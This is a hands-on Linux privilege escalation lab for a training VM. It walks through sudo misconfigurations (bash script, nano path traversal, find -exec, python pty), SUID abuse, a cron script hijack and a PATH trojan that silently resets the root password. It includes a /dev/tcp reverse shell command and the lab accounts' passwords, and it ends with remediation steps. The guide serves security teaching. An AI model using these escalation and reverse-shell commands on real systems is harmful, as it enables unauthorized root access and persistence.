#  Privilege Escalation Lab

## Download and Setup Instructions:

[**Virtual Machine Download Link**](https://drive.google.com/file/d/10Z7TenbWnk2cP1LMnQjFkP9rwPz0TQsa/view?usp=sharing)

---

Before starting the lab, make sure you downloaded the ZIP file
provided to you. When you do that, begin to unzip the file and place the
folder wherever appropriate. These following instructions assume you are
using a VMware Workstation Client, however most of these instructions
are easy to follow no matter what VM client you use.  
  
Go to the **File** tab in the upper left hand corner of the window, once
you have clicked it, a drop down menu will appear. From there, click on
**Open**. It should then open up a file explorer, navigate to where you
put your VMs and do either of the following. Click on the
`Sprint1_Cyber Patriot.vmx` image and it should appear within your
client. If that does not work, click on the `Sprint 1_Cyber
PatriotVM.ovf`, from there it will open up an import menu, where you can
name your VM and choose where to store it.  
  
Once you have chosen both of these click on the **Import** button, and
the VM should appear for you! Once you have the VM in front of you,
click on the **Edit Virtual Machine Settings**, here is where the
settings for the VM are. Below is an image showing what your VM
settings should be, if needed you can always turn down how much **Hard
Disk** space the VM is taking up, as you would not need too much for
this. Once checked out you should be good to go, by clicking **Ok**, and
then click on **Power on this Virtual Machine**.  

<img src="media\image1.png" style="width:4.38021in;height:4.20417in" />  
  
## User Accounts:

For this lab, we will be using this main user, while switching between
the others when needed. This was done to create various scenarios in
which different users would have various privileges given to them, and
within those scenarios would be different ways in which they could
either make it to the root user, or use commands to get access to files
they would normally not have access to.:

-   cyberuser - Administrator
    -   User Login: `CyberPatriot-Linux`
    -   Password: `CyB3rP@tRi0t`

## Background Knowledge:

1. What is Privilege Escalation? The act of exploiting either a bug, design flaw, or configuration error within an OS in which a regular user can access commands or files that should not normally be given to them.
2. What is SUDO? A unix command in which system administrators or specific users execute specific commands as the root user. Most SUDO users are added to a group, or specific functions can be given to them.
3. How do you know if you are a sudoer? To check access if a user is a SUDO user or have specific commands, use the `sudo -l` command. You could also possibly use `id` to list out if a user is part of a SUDO group.
4. How can you check SUDO privileges for everyone? If you are a root user, or if you have the correct permissions, `nano /etc/sudoers` are one of the many ways to check to see the privileges given to you. You may need to use the `sudo` in front of the nano command.
5. Do you know how to switch users? The `su` command is commonly used to switch between users while in a terminal. This will be used to switch between the users at any given time.

Once logged in, make sure to run this command to make sure your systems
are up to date:

```
sudo apt update
sudo apt update  
sudo apt upgrade
```

Once that is done, check to see the SUDO privileges for everyone, take a
note here for some of the privileges given to the various users here.
Feel free to come back here whenever you may encounter difficulties and
are not sure where to go next.

## Exploiting Sudo Privileges

## Exploiting bash script file:

### Frequently Asked Questions:

1. What is a bash script file? A bash script file is a normal plain text file that contains a set series of commands which you would normally have to type out in order to accomplish. Bash scripts can be used for various purposes such as executing a shell command, running multiple commands, and adjusting administrative tasks. In order to invoke the bash shell, you put the `#!/bin/bash` as the first line of all of your scripts.
2. What is a shell? A program that provides a user an interface between the user and the OS. It provides the user a way to execute utilities and programs.
3. How do you run an executable program in linux? Make sure you have `./` in front of the script/executable before attempting to run it.

As you may have noticed by taking a look at the `/etc/sudoers/` file,
the user Derek has sudo access for his home directory of
`/home/Derek/`. Now while this can pose a series of risks, the one we
will be going over in this scenario is a bash script exploit.  
Derek’s Credentials are:

User: `Derek`  
Password: `Derek001`

To accomplish this, let's switch over to Derek, to do this use:  

```
su Derek
```

Then input the password given to you once prompted. Next you will need
to make sure you are in the correct directory, use the `pwd` command
to find out where you are located within the file directory. If you are
located within `/home/Derek/` great! If not, it is not a big deal, we
will need to change directories by using the `cd` command, in this
instance:  

```
cd /home/Derek/  
```

Now that we are in the correct directory, the fun can begin! How about
we do the `ls` command first to see what we are working with.
Everything seems normal, but what is this `secret.sh` file doing
there? How about we see what is inside? You don’t always need to use a
text editor to check in files, for this case, how about we use the
command `cat`?  

```
cat secret.sh
```

This appears to be a Bash script file! You could tell by looking at the
top of the file, or the **shebang** line, which points to the specific
Shell the script will be parsed n this case Bash. When using scripts, it
will perform whatever command listed when you decide to run it. How
about we give it a try then? In order to run the script we will need to
do:

```
./secret.sh  
```

Awesome, if everything worked correctly, it should have worked echoing
the line `This is my Secret!`. However, we have sudo access for this
whole entire directory correct? Not to mention free reigns to edit this
script. Very interesting, how about we open up this script then? (Once
again use any text editor of your choice, for most instances I use
`nano` or `vi`)

How about we do something a bit malicious? Add another line to the code
by pressing the enter key after the end of the command listed within.
Then add this line of text:

```
/bin/bash -i  
```

By using this command, a bash shell would be created! However, the real
devious part comes next, save and exit your newly changed script file:  
  
**Note:** (If you are using **nano ctrl+s** and then exit by **ctrl+x.**
If you use **vi,** while similar to nano, you need to do specific
commands to write, save and exit out. To write press **I** and edit the
text as needed, to save after writing press **ESCAPE** and then type
**:w!**. Finally to exit use the **:qa!** command).

Next, we are going to be running the command again but this time put the
**sudo** command in front of the script. Since Derek is a sudo user,
Derek can get away with this scott free! The command should look like this:  

```
sudo ./secret.sh  
```

Do you notice anything different? We are now the root user! But how?
Since we executed the script as root, it created the new bash shell as
the root user, rather than Derek! If you are curious enough to run it
without sudo, a new bash shell would be created as Derek, even though it
looks like nothing changed. Now that you are root you can do anything to
your heart's content! We will cover come of the devious acts you can now
do later, but for now you now know how to get privileged use from a bash
script! For now use the `exit` command until you are back to the
`cyberuser` account.

### Exploiting Nano:

### Frequently Asked Questions:

1. We know how to change directories, but how do you go backwards with them? You would use the cd command followed by .. in order to go back, `cd ..`

Since we are back as Cyberuser, check the `/etc/sudoers` file again to see
what user has the sudo rights to use nano. You should be able to tell
now by looking at the names given, I will give you crucial information
for the password to be able to `su` to that user.

**User: name of user who has sudo rights for nano  
Password: same name with a 002 at the end of it**  

  
For example it should look like this, but instead of test it would be
the sudo nano user:

**User: Test  
Password Test002**

Were you able to find it? Great! Now that you have switched over to
the user, we will explain the privilege that he has. He can use sudo
with nano, however as you may have noticed when looking in the
`/etc/sudoers/` folder, it listed another file directory after that,
that being the `/var/opt/` directory. How about we `cd` over there?
As usual, use the `ls` command to see what is inside specific
directories, and how about that! A text file is waiting for us there. If
we do our regular nano we can open it but not edit it, however if we use
our command:

```
sudo nano /var/opt/hello
```

We can! It kind of looks boring in there though, and there is nothing
special about this file at all! We have sudo for nano, why don't we try
a bigger more important file like `/etc/sudoers`? How about we give
that a try:

```
sudo nano /etc/sudoers  
```

What gives! We have sudo access for Nano, why can't we open it! This is
because of the aspect of these users' sudo nano privileges I mentioned
above. Since it lists the `/var/opt/` path directory right after the
`/bin/nano` it means it can only be used within that directory. What a
bummer! What can we even do with this? Well I am glad you mentioned!  

Nano has some weird technicalities involved with it. Do you know how you
can use the `cd` command to go back one directory at a time by using
the `..` argument? Well, you can do this with nano as well! For example, do
this following command:  

```
sudo nano /var/opt/../../home/Derek/secret.sh  
```

Woah! We were able to navigate from `/var/opt/` and make it to Derek's
directory and open up `secret.sh`! That is alarming, but wait a minute, if
we can do that, can we also do that with the `/etc/sudoers` file? Give
that a try now that you have practice with the nano!  
  
If everything went according to plan, yes! You now have access to the
sudoers file, you can give free reign to any other user or even
yourself! Not only that you have access to any file that would need
permission to get access to such as the `/etc/passwd` and
`/etc/shadow` files, both of which store crucial password information! 
The potential is large here! Who would have thought a
slight over configuration of sudo could do this? Exit out of this user
to get back into cyber user to move onto the next exploit..

## Exploiting Find/Python/Cat:

### Frequently Asked Questions:

1. What is the find command? One of the most commonly used commands, is able to search and locate lists of files and directories.
2. What is Python? Programming language that is very commonly used, Linux has two separate commands for it, Python 3 and Python 2.
3. What is arbitrary code execution? Arbitrary code means malicious code that can be written by an individual to get access to files, directories and privileges that normally wouldn’t be accessible.

As Cyberuser checks through the `/etc/sudoers` file once more to try
and see which user has sudo access to find/cat and python. Once you have
`su` to that user, an example of what the username and password would
be below, with test being the user name:

**User:test  
Password:test003**

Now that we are logged in, we can have a bit of fun! Firstly, we have
used cat already to look through specific files, how about we try it
first with:

```
cat /etc/sudoers  
```

Shoot! That doesn’t work because we need permission to access this,
however since we do have sudo with the `cat` command…:

```
sudo cat /etc/sudoers  
```

Perfect! We got a complete print out of the entirety of the sudoers
file! Not only can we do this with this file, we can do it with any file
throughout the entire VM that would need permission to get access to!  
  
Next, how about we try the `find` command? This is a command that is used
for, well finding files and directories! Pretty useful, let's test it
out first by doing:  

```
find /home  
```

Woah! Thats a lot of output you just got. At first glance it looks like
an innocent enough command, however there is a secret to the `find`
command, the `-exec` flag. By using `-exec` you can input arbitrary
code that will be used after the find command is complete, however when
we run this as a Sudo user, it will run that arbitrary code as root, for
example:

```
sudo find /home -exec sh -i \;
```

Running `sh -i` after the `-exec` flag will give us a root shell,
giving us once again, free reign to do whatever we want for the entirety
of this system. The only issue that may arise from this, is that you may
get stuck within your shell. Which if that is the issue, close out of
your terminal, open it again and then SU to that same user you just
were.

We can spawn an additional shell thanks to `python` as well. Follow
this command to spawn a new bash shell, and since we do it as sudo, we
become the root user!:

```
sudo python -c 'import pty;pty.spawn("/bin/bash");'
```

## Exploiting SUID:

### Frequently Asked Questions:

1. What is SUID? Set user id is a feature that allows users to execute a command or file with the permissions of a specific user. For instance, ping command usually requires root privilege, but its SUID is set to have it capable of being used by any user.
2. How do you check what commands have SUID access? `find / -perm -u=s -type f 2>/dev/null` is the command you use to check for a large list of them. To dissect it, `find` searches for the `/` which represents the entirety of the filesystem. `-perm` and `-u=s` allow us to search for the specific SUID bit and `-type f 2>/dev/null` gets rid of any errors we may find along the way.
3. How do I make sure a specific command listed does have the SUID set? Use `ls -la /path/to/command` to check SUID. It should show up as `-rwsr-xr-x`, you are looking for the `s` in particular, if that is not present SUID is not set.

This part should be done with the user:

**User: Chrono  
Password: Chrono004**  

When you have switched over, run the command to check and see what
commands have the proper SUID configuration that we can begin to
exploit. One of the commands should be surprising, yes once again it is
the find command! Not only did this Linux configuration give a specific
SUDO privilege, but gave everyone access to use find as a root user! To
check this do the command:

```
find /home/Chrono/Trigger -exec whoami \;  
```

If it pops up as root, we have a winner! The find command is yet again
vulnerable! However, we are going to be doing something different here.
Technically this can be done with any privilege escalation technique you
have found so far, but I found it fitting to put it here to teach you
something new while using something familiar. I will teach you now about
using your higher privilege to create reverse shells.

A reverse shell is a shell session that is created on a connection that
is **STARTED** from a local machine, meaning that if you were to have
an attacker and a victim box, the victim would be the one establishing
the connection to the attacker, while the attacker listens to the
connection attempting to be made. Normally this would be done with two
separate boxes, with both having two separate IPs, however we can still
test out reverse shells right now by opening another terminal. For this
other terminal, `su` to the user:

User: `Cassidy`
Password: `Cassidy005`  
  
While Cassidy, we will be using the `nc` or `netcat` command. This
command is a networking utility tool used for reading, writing and
redirecting data across a network. In this first instance, we can have
Cassidy listen for data connections trying to be established on a
specific port. In this case let's use the port `4444`. Usually you would
want to use a port that is commonly used or open through the firewall,
most of the time would be a port such as `80`, which deals with HTTP
connections! Anyways, use this command:

```
nc -lvp 4444
```

Cassidy will now be listening for any type of data connection trying
to go through at that point now! Let us use our other terminal and have
Chrono exploit the find command to allow a reverse shell to be made! For
this case I will do the command first and then explain what exactly it
is doing:

```
find /home/Chrono/Trigger -exec bash -p -i > & /dev/tcp/0.0.0.0/4444 0>&1 \;  
```

The beginning of this command is just as normal, `bash` is when things
start to look different, we are calling for a Bash shell from using this
command, the `-p` is for privilege, you will need to use this flag at
times when trying to exploit SUID, if you do not, you may not be able to
run as root. The `-i` creates the interactive shell, `>&` is
signifying where the standard output is going, in this case the
`/dev/tcp` path. `nc` uses tcp connections so this is required to
have this work. Since we are running this locally, `0.0.0.0` is our
IP, but here is where you would put the attacker IP. `4444` is our port
and `0>&1` is the standard input connection.  
  
By running this as Chrono, you should be able to check over onto
Cassidy's terminal and notice we have a bash shell session created. Use
the ID command and you should notice we are root! Reverse shells are
incredibly dangerous for the system but very helpful for attackers as it
establishes a persistence for them, and this can be done whenever an
attacker can receive escalated privileges. When you are done with the
shell use `exit` or ctrl+c to get out of there. We will be moving onto
the next SUID exploit now!

These next two commands have very similar uses, but nevertheless are
quite strong. Firstly, we will be taking a look at the `vim.tiny`
command, `vim.tiny` is yet another text editor we have access too, and
we can make sure that we have SUID privileges by running either command
mentioned earlier again. Because we have SUID access we can get access
to specific read/write access to certain files yet again. We already
know we cant nano into the sudoers file, but how about we try it with
`vim.tiny`:

```  
vim.tiny /etc/sudoers
```

Well look at that! We can edit these private files with anyone on the
box thanks to SUID. However, what if we don't want to edit anything and
essentially `cat` the file? Well thanks to the `less` command we
can! `less` displays large text files in much more digestible fashions
such as pages at a time, rather than one large block of text, and thanks
to SUID we can use it to open up private files, lets try this:  

```
less /etc/passwd
```

You should get the output of the `passwd` file here! It is also worth
mentioning that with both `less` and `vim.tiny` you could
potentially set up shells in here, but the process is slightly more
complicated due to the SUID being dropped when you try to create the
shell, which would require a lot more work to get working rather than
how we did it with `find`.

## Exploiting a CRON job:

### Frequently Asked Questions:

1. What is a cron job? Cron jobs are used for scheduling tasks by doing a series of commands at a specific time or date on a server or machine. Commonly used by sysadmins on a server to create backups or clean up tmp files. Comes from the word crontab, which makes sense as you can find cron jobs within the `/etc/crontab` directory.
2. How do you read the jobs within `/etc/crontab`? When looking at the different cronjobs you will notice it look something like this:  
```
****     USERNAME    /path/to/command
```
Those five stars at the beginning of the Cron Job signify from left to right, Minute, Hour, Day of Month, Month and then Day of week. `USERNAME` signifies which user will commit this task, for crons it is usually the `root`. Lastly, the `/path/to/command` shows you where the command being run is being used.

For this next exploit, you can be allowed to use any user other than
cyberuser or root to accomplish this task, however I will show it
through the usage of the user Cassidy, the information for his should be
listed above.  
  
First things first, let's take a look at the sub directories in our
`/home` directory, by now, you should know the command that lists out
what is in a directory, in addition to recognizing all of these other
directories by now… with the exception of one. What is that `cleanup`
directory doing there? Let's take a look at it by using `cd`.  
  
As you should when looking in directories, list out what is inside of it
and see what you find. There are instructions in here! Why don't we take
a gander at it by either using a text editor or `cat`.  
  
Interesting, it says everything within the `Temporary` sub directory
will be deleted within two minutes! Why don’t we see if this CRON Job
even works first! `cd` into it and use the `touch` command to create
a file! But wait, why wont it work? We must not have the correct
permissions to do so. Use any of the exploits that you have used at this
point to try and create a file within here (Hint: SUID exploits are your
friend here).  
  
After you have done this, wait around for about 2 minutes or so, you can
use the `date` command to keep a track of time. Lo and behold, the
file you should have created is now deleted! Now that we know this CRON
Job works, lets see if we can mess around with it.  
  
First we need to find where the cleanup CRON Job is located! We know
that Crons are listed within the `/etc/crontab` directory, so how
about we go and check that out. Let us try to `cat` or use a text
editor, but drat! Yet again we do not have permission to do so, but
that's okay, we have a myriad of ways to get into this file! Do whatever
you feel to access this file (Hint: SUID exploits are your friend
here).

From looking in this file, we can see that this cleanup Cron Job has a
specific directory path, how about we try to open it up and see if we
can change any of it around? Surprisingly, it worked! Whoever made this
script for the Cron Job made it accessible to everyone, which is not
safe at all. Now that we have gotten in, change the `os.system` line
to look like this:

```
os.system('chmod u+s /bin/dash')
```

With that changed, save and exit out of the file. What we did here was
change the cron job to instead of delete everything within the
`/home/cleanup/Temporary` directory every 2 minutes, we made it so
that every 2 minutes, the **SUID** bit is added to `/bin/dash`
enabling us to create another new root shell within our system! To do
this do the command:  

```
/bin/dash -p
```

By performing this command, a root shell will be spawned, giving us yet
again more privileged access to use. We need the `-p` command because
without it, the **SUID** root privileges will not go through and the
shell would just be run as whoever user did the command, not the root.

## Exploiting PATH variable

### Frequently Asked Questions:

1.  What is the purpose of a Path Variable? The Path Variable makes it so you do not need to write the entirety of the path to a program every time you would want to run it, essentially it is used as a shortcut. Example: to run a script you would need to do `./script` but with the correct Path variable set all you would need to do is type in `script`.

For this part of the lab, you will actually stay as the Cyberuser at
first! Cyberuser, as our admin can do anything that the root user would
be able to do without having to be logged in as the root. This includes
tasks such as changing passwords! Now up until now I have not divulged
the password to root. Well you have made it far enough so you deserve
it! The login for root is…:

User: `root`  
Password: `toor`

Yes, it is just root backwards, how devious! Well anyway, keep this in
mind, you do not need to log into root right now.

Anyways, let us say Cyberuser is very lazy, Within the
`/home/cyberuser` directory, cyberuser needs to put a `./` every time
they need to run their favorite script, `whoisthebest`. In order to
alleviate the hard task of needing to put that pesky `./` every time
they decide to change their Path variable to get rid of that! To do
this, run the command:

```
PATH=.:${PATH}  
export PATH  
```

Now we do not need to do `./whoisthebest` to run the command, we can
just type in `whoisthebest`! Imagine all of the productivity cyberuser
can have now by doing this!  
  
Let’s just say Chrono over hears this and gets pretty frustrated at what
cyberuser is doing. Not only does cyberuser have all the privileges,
they can’t be bothered to put in the `./`? How lazy! However, this
gives Chrono an idea.
  
Switch over to Chrono and go into his `/home/Chrono` directory, create
a new file:

```
nano ls
```

And within that file type this command:

```
echo -e "Hello World\nHello World" | sudo passwd root > /dev/null 2>&1  
```

After that is done make sure to make it an executable:  

```
chmod +x ls  
```

What is the reason for this? Well due to cyberuser changing his path
variable to not need the `./` to run scripts, Linux will now search
for the program in the current directory first, before beginning to
search elsewhere. This causes an issue now, due to Chrono naming his new
script `ls` instead of running the command that lists out what is in
the current directory, it will run his script first!
  
Now what exactly does the script he made do? It echoes `Hello World`
twice, with a new line created between them. It takes these two **Hello
World** phrases and it puts it into the `sudo passwd root` command due
to the `|` between the two commands. We have two **Hello World** phrases
because when you change a password in Linux you need to confirm it by
typing it twice, this circumvents that issue. Lastly the `> /dev/null 2>&1` 
at the end of the obfuscates the command when you run it, 
making it show nothing as an output.  
  
This works to our favor now, Chrono can trick cyberuser into saying that
the `ls` command is not showing his files in his directory, since
cyberuser is the admin, he will go check it out and run the command.
However due to the path variable set earlier, it will not run the
regular `ls` command, but the password changing script that Chrono
made. To add credibility to Chrono’s story, nothing will be outputted
thanks to the obfuscation,, making it really appear that the `ls`
command is not working, when in reality, the passwd for root just
changed to `Hello World`.  
  
How about you try it out? Switch back over to cyberuser, go to Chrono’s
directory and run the `ls` command. Shows nothing right? That means
that the script was a success! To test this out, how about we try to
switch to root now by using the `root`/`toor` password combination, which
should not work now. However, if you try `root`/`Hello World`, you should be
able to get right in!  
  
This method can be used for more than just changing passwords, as long
as you would know how to script it, you should be able to change and
exploit to your heart's content.

## Remediations of Exploits

### Fixing SUDO Privileges:

SUDO can cause a lot of damage, is there any way to combat this?
Thankfully there are a lot of ways to fix this from being an issue.
First, never give sudo rights to any program that allows you to escape
the shell. As we have seen from most of these commands, they were able
to use their sudo privilege to straight up bypass permissions or create
new shells where they are the root user, just because of one small
oversight. You should also never give sudo rights to any command that is
a programming language compiler, interpreter or an editor, such as
`nano`, `python` and `less`. If you follow this, and always keep aware
of what users you are giving specific privileges to, you shouldn’t have
to worry about this at all. If you would want to fix your system right
now, use a text editor of your choice as cyberuser and delete all of the
users permissions within there, with the exception of root and
cyberuser.

### Fixing SUID:

Once more, we can see the dangers of over assigning variables to
something within linux, this time with programs rather than users. Much
like sudo, putting SUID rights on anything type of interpreter, or
anything that can create/leave the shell automatically puts you in a
very high risk scenario, so it is often best to not do that in the first
place. What about if a command was set like that? Well, as root or
cyberuser, you can use the command `chmod` to remove an SUID from a
program, use the following:

```
chmod u-s /path/to/command
```

Feel free to do this on any command that does have the SUID present that
you would not feel comfortable having, or the three we showcased in this
instance.
  
### Fixing CRON:

In order to prevent this from happening, make sure any script used that
is defined in the cron job can only be accessed via root, and should not
be writable by anyone except the root user. This can be accomplished by
doing these two commands as root or cyberuser:

```
sudo chown root:root /path/to/file
sudo chmod 700 /path/to/file  
```

This changes the permissions for the file to only be accessed if you
are a root user or if you have the correct permissions. However, if
there are still exploits present that allow you to become root, you can
still use that as was demonstrated in this lab, so you would need to
take care of that as well. Additionally, make sure the `/etc/crontab`
directory can not be accessed by anyone except the root user, this was
accomplished in this lab actually, but we were still able to use the
exploits present to gain access.  
  
### Fixing PATH:
The remediation to this is to just not use the Path Variable. Most of
the time, setting the Path Variable in this fashion causes more harm
than good, the time saved not having to type out `./` is not worth it
if you can get tricked into running malicious code.
